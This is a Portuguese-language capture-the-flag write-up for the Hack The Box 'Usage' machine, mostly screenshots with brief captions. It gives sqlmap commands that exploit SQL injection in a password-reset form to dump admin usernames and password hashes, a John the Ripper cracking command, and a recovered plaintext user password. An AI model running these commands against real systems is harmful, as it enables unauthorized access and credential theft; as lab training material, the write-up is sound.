Enumeração de serviços:
![[Write-up/Hack The Box/Usage/img/Pasted image 20240414155428.png]]

Identificação do subdomínio admin
![[Write-up/Hack The Box/Usage/img/Pasted image 20240414155910.png]]

Cadastro do usuário:
![[Write-up/Hack The Box/Usage/img/Pasted image 20240414162721.png]]

Login com usuário criado:
![[Write-up/Hack The Box/Usage/img/Pasted image 20240414162753.png]]

Login realizado com sucesso:
![[Write-up/Hack The Box/Usage/img/Pasted image 20240414162813.png]]

Teste de SQL Injection com sqlmap:
```bash
sqlmap -r forget-password.req -p email --batch --technique="UB" --risk=3 --level=5
```
![[Write-up/Hack The Box/Usage/img/Pasted image 20240415102931.png]]

Buscando informações dos bancos de dados:
```bash
sqlmap -r forget-password.req -p email --batch --dbs
```
![[Write-up/Hack The Box/Usage/img/Pasted image 20240415103423.png]]

Buscando informações das tabelas do banco de dados usage_blog:
```bash
sqlmap -r forget-password.req -p email --batch -D usage_blog --tables
```
![[Write-up/Hack The Box/Usage/img/Pasted image 20240415112641.png]]

Buscando nomes das colunas na tabela admin_users do banco usage_blog:
```bash
sqlmap -r forget-password.req -p email --batch -D usage_blog -T admin_users --columns
```
![[Write-up/Hack The Box/Usage/img/Pasted image 20240415113510.png]]

Recuperando os valores das colunas username e password da tabela admin_users:
```bash
sqlmap -r forget-password.req -p email --batch -D usage_blog -T admin_users -C username,password --dump
```
![[Write-up/Hack The Box/Usage/img/Pasted image 20240415113949.png]]

Quebra da senha:
```bash
john admin-hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![[Write-up/Hack The Box/Usage/img/Pasted image 20240415114148.png]]
Login no painel administrativo:
![[Write-up/Hack The Box/Usage/img/Pasted image 20240415120823.png]]

Dashboard administrativo:
![[Write-up/Hack The Box/Usage/img/Pasted image 20240415120851.png]]

![[Write-up/Hack The Box/Usage/img/Pasted image 20240415133447.png]]

![[Write-up/Hack The Box/Usage/img/Pasted image 20240415132153.png]]

![[Write-up/Hack The Box/Usage/img/Pasted image 20240415133532.png]]

![[Write-up/Hack The Box/Usage/img/Pasted image 20240415133617.png]]

![[Write-up/Hack The Box/Usage/img/Pasted image 20240415133650.png]]

![[Write-up/Hack The Box/Usage/img/Pasted image 20240415133734.png]]

![[Write-up/Hack The Box/Usage/img/Pasted image 20240415133856.png]]

Senha do usuário xander no arquivo /home/dash/.monitrc
`3nc0d3d_pa$$w0rd`
